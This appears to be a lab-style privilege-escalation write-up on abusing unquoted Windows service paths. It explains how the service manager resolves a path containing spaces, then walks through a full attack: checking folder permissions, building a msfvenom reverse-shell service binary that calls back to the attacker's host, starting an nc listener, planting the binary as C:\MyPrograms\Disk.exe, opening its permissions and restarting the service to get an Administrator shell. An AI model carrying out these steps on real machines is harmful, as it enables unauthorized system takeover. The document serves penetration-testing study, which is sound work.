# Unquoted Service Paths

hen i can't directly write into service executable as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature

when working with windows service, a very particular behaviour occurs hen the service is configured to point to an `"Unquoted"` executable, by unquoted. mean that the path of the associated executable isn't properly quoted to account for space on the command

As an example the difference between two service, the first service wwill use a proper quotation so that the SCM knows without doubt that it has to execute the binary file pointed by `C:\Program Files\RealVNC\VNC\Server\vncserver.exe`

```cmd
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

> Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.

Now look at another service without proper quotation:

```cmd
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

When the SCM tries to execute the associated binary, a problem arises. Since there are space on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't kno hich of the following you are trying to execute:


Command					Argument 1				Argument 2
C:\MyPrograms\Disk.exe			Sorter					Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk 			Sorter.exe				Enterprise\bin\disksrs.exe	
C:\MyPrograms\Disk Sorter 		Enterprise\bin\disksrs.exe	


This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of quoted string. This means the "right" interpretation of the unquoted command wwould be to execute `C:\MyPrograms\Disk.exe` and take the rest as arguments


 - First, search for` C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
 - If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
 - If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.



## Real Case

let's assume i've got credential that allow to create subdirectories and file, and i checked the permission of `C:\MyPrograms` directory with `icacls`

```cmd
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

so, let's create the payload, here im using msfvenom to create the payload and upload it to the server

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=My-IP LPORT=7331 -f exe-service -o revsvc.exe
```
also start a listener to receive the reverse shell when it gets executed
```bash
nc -lvp 7331
```
Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, I will be moving the payload to `C:\MyPrograms\Disk.exe`
```cmd
C:\> move C:\Users\svcuser\revsvc.exe C:\MyPrograms\Disk.exe
```
make sure to grand everyone full permission on the file so it can be executed by the service
```cmd
C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

restart the service, so the payload should execute
```cmd
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

as a result, i get a reverse shell with Administrator privileges
```bash
user@0xbscure$ nc -lvp 7331
Listening on 0.0.0.0 7331
Connection received on 10.10.10.10 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
Users\Administrator
```
        
